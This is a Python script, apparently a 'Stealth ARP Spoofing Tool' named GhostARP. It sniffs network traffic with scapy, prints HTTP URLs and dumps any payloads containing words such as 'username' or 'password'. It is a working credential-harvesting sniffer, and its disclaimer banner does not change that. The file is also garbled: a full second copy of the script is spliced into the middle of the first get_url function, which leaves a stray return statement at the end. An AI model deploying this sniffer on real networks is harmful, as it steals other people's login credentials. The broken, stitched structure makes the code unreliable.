#!/usr/bin/env python

import scapy.all as scapy
# Requirements pip install scapy_http
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):#!/usr/bin/env python

import scapy.all as scapy
import os
import sys
from scapy.layers import http

# GhostARP Banner with Yellow Color and Disclaimer
def display_banner():
    yellow = "\033[93m"
    cyan = "\033[96m"
    red = "\033[91m"
    reset = "\033[0m"
    banner = yellow + """
               ________      _____________________________       
               __  ___/_________(_)__  __/__  __/__  ____/___  __
               _____ \__  __ \_  /__  /_ __  /_ __  __/  __  |/_/
               ____/ /_  / / /  / _  __/ _  __/ _  /___  __>  <  
               /____/ /_/ /_//_/  /_/    /_/    /_____/  /_/|_|             
                       """ + cyan + """---- Stealth ARP Spoofing Tool ----
        ===================================================================
                       𝕍𝕖𝕣𝕤𝕚𝕠𝕟 : 1.0     𝕋𝕨𝕚𝕥𝕥𝕖𝕣 : anishalx7        
        ===================================================================              
    """ + red + """
    DISCLAIMER: 
    Unauthorized use of this tool to sniff traffic or manipulate 
    networks without explicit permission from the target is illegal. 
    The developer is not responsible for any misuse or illegal activities.
    """ + reset
    print(banner)


def list_interfaces():
    """Returns a list of available network interfaces."""
    return os.listdir('/sys/class/net/')  # List all interfaces in Linux


def sniff(interface):
    """Start sniffing on the provided interface."""
    print(f"[*] Starting sniffing on {interface}...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    """Extracts the URL from an HTTP request packet."""
    try:
        return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    except Exception as e:
        print(f"[!] Error retrieving URL: {e}")
        return None


def get_login_info(packet):
    """Extracts potential login information from packet."""
    try:
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8')
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword.lower() in load.lower():
                    return load
    except Exception as e:
        print(f"[!] Error processing login info: {e}")
        return None


def process_sniffed_packet(packet):
    """Processes sniffed packets and prints any relevant information."""
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


# Main execution
if __name__ == "__main__":
    display_banner()

    try:
        # List available interfaces for the user
        available_interfaces = list_interfaces()
        print("[*] Available network interfaces: " + ", ".join(available_interfaces))

        # Prompt the user for an interface
        interface = input("[*] Enter the interface to sniff (e.g., eth0): ")

        # Check if the entered interface is valid
        if interface not in available_interfaces:
            print(f"[!] Error: '{interface}' is not a valid interface. Please select from the available interfaces.")
            sys.exit(1)  # Exit the script with an error code

        # Start sniffing
        sniff(interface)

    except KeyboardInterrupt:
        print("\n[!] Sniffing process interrupted. Exiting gracefully...")

    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")

    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')  # Ensure proper decoding
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.lower() in load.lower():  # Case-insensitive matching
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


sniff("eth0")  # Adjust the interface as per your system
